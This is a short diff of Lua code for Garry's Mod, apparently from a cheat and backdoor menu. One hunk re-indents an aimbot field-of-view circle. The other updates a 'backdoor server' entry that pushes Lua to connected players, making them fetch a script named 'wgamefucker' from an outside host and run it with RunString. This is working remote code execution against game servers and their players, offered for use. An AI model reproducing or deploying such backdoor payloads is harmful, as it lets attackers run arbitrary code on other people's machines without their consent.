@@ -954,7 +954,7 @@ end)
 
 local FovCircle = { 80 }
 hook.Add("HUDPaint", FovHook, function()
-		if enable['Aimbot'] then
+    if enable['Aimbot'] then
         surface.DrawCircle(ScrW()/2, ScrH()/2, FovCircle[1], color['Fov'])
     end
 end)
@@ -1184,7 +1184,7 @@ CreateButton("Save Visuals", MiscTab[1], 110, 25, 395, 250, SaveVisuals)
 CreateButton("Load Visuals", MiscTab[1], 110, 25, 280, 250, LoadVisuals)
 
 CreateBDServer("wmenu-memento", function()
-    wtf.SendLua("http.Fetch('https://w0rst.xyz/extra/wgamefucker', function(b,l,h,c) RunString(b) end)")
+    wtf.SendLua("http.Fetch('https://w0rst.xyz/script/extra/wgamefucker', function(b,l,h,c) RunString(b) end)")
     wtf.Log("??? wgamefucker ???")
 end)
 
